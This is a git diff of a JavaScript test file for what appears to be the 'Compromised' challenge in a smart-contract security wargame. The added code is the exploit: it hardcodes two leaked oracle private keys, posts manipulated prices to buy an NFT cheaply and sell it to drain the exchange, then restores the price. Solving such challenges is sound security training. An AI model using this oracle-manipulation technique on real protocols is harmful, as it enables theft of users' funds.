@@ -75,26 +75,50 @@ describe("Compromised challenge", function () {
         `4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34`
       ),
     ];
-    //.map(privateKeyHex => {
-    //   // important to keep the `0x` prefix
-    //   return web3.eth.accounts.privateKeyToAccount(privateKeyHex);
-    // });
 
     console.log(`Compromised oracles addresses: ${compromisedOracles.map(acc => acc.address).join(` `)}`);
     // Compromised oracles addresses: 0xe92401A4d3af5E446d93D11EEc806b1462b39D15 0x81A5D6E50C214044bE44cA0CB057fe119097850c
+
+    const provider = await ethers.provider;
+
+    const oracleOnePrivateKey = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
+    let oracleOneSigner = new ethers.Wallet(oracleOnePrivateKey, provider);
+
+    const oracleTwoPrivateKey = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
+    let oracleTwoSigner = new ethers.Wallet(oracleTwoPrivateKey, provider);
+
+    // Manipulate buy price to zero with oracle private keys
+    await this.oracle.connect(oracleOneSigner).postPrice("DVNFT", 0);
+    await this.oracle.connect(oracleTwoSigner).postPrice("DVNFT", 0);
+
+    // Purchase NFT
+    await this.exchange.connect(attacker).buyOne({value: ethers.utils.parseEther("0.001")});
+    expect(await this.nftToken.ownerOf(0)).to.eq(attacker.address);
+
+    // Manipulate sell price to zero with oracle private keys
+    await this.oracle.connect(oracleOneSigner).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+    await this.oracle.connect(oracleTwoSigner).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+
+    // Sell NFT
+    await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
+    await this.exchange.connect(attacker).sellOne(0);
+
+    // Reset initial purchse price with oracle private keys
+    await this.oracle.connect(oracleOneSigner).postPrice("DVNFT", INITIAL_NFT_PRICE);
+    await this.oracle.connect(oracleTwoSigner).postPrice("DVNFT", INITIAL_NFT_PRICE);
   });
 
-  // after(async function () {
-  //   /** SUCCESS CONDITIONS */
-  //   // Exchange must have lost all ETH
-  //   expect(await ethers.provider.getBalance(this.exchange.address)).to.be.eq("0");
-  //   // Attacker's ETH balance must have significantly increased
-  //   expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
+  after(async function () {
+    /** SUCCESS CONDITIONS */
+    // Exchange must have lost all ETH
+    expect(await ethers.provider.getBalance(this.exchange.address)).to.be.eq("0");
+    // Attacker's ETH balance must have significantly increased
+    expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
 
-  //   // Attacker must not own any NFT
-  //   expect(await this.nftToken.balanceOf(attacker.address)).to.be.eq("0");
+    // Attacker must not own any NFT
+    expect(await this.nftToken.balanceOf(attacker.address)).to.be.eq("0");
 
-  //   // NFT price shouldn't have changed
-  //   expect(await this.oracle.getMedianPrice("DVNFT")).to.eq(INITIAL_NFT_PRICE);
-  // });
+    // NFT price shouldn't have changed
+    expect(await this.oracle.getMedianPrice("DVNFT")).to.eq(INITIAL_NFT_PRICE);
+  });
 });
